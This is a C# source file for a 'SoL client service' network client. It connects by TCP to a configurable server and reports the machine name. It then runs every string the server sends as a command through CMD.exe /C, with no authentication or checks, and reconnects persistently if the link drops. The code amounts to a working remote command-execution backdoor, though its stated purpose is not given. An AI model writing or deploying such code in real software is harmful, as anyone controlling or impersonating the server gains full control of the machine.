using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace SoL_client_service
{
    public class NetworkClient
    {
        TcpClient client;
        string SERVER_ADDRESS;
        int PORT;
        bool Connected = false;
        bool ServiceEnabled = false;

        public NetworkClient()
        {
            SERVER_ADDRESS = "127.0.0.1";
            PORT = 870;
        }
        public NetworkClient(string SERVER_ADDRESS, int PORT)
        {
            this.SERVER_ADDRESS = SERVER_ADDRESS;
            this.PORT = PORT;
        }

        public void Connect()
        {
            while (!Connected)
            {
                try
                {
                    string name = Environment.MachineName;
                    byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes(name);
                    client = new TcpClient(SERVER_ADDRESS, PORT);
                    NetworkStream nwStream = client.GetStream();
                    nwStream.Write(bytesToSend, 0, bytesToSend.Length);
                    byte[] bytesToRead = new byte[client.ReceiveBufferSize];
                    int bytesRead = nwStream.Read(bytesToRead, 0, client.ReceiveBufferSize);
                    nwStream.Flush();
                    Connected = true;
                }
                catch
                {
                    //If connection failed wait some time...
                    Thread.Sleep(1500);
                }
            }
        }
        private void HandleServer()
        {
            while (ServiceEnabled)
            {
                try
                {
                    NetworkStream nwStream = client.GetStream();
                    byte[] buffer = new byte[client.ReceiveBufferSize];
                    int bytesRead = nwStream.Read(buffer, 0, client.ReceiveBufferSize);
                    if (bytesRead < 1)
                        throw new Exception();
                    string dataReceived = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                    System.Diagnostics.Process.Start("CMD.exe", "/C " + dataReceived);
                }
                catch
                {
                    if (ServiceEnabled)
                    {
                        Connected = false;
                        Connect();
                    }
                    else
                    {
                        return;
                    }
                }
            }
        }

        Thread Service;
        public void StartSoLService()
        {
            Connect();
            ServiceEnabled = true;
            Service = new Thread(new ThreadStart(HandleServer));
            Service.Start();
        }

        public void StopSoLService()
        {
            while (Service.ThreadState == ThreadState.Running)
            {
                ServiceEnabled = false;
                Service.Abort();
            }
        }
    }
}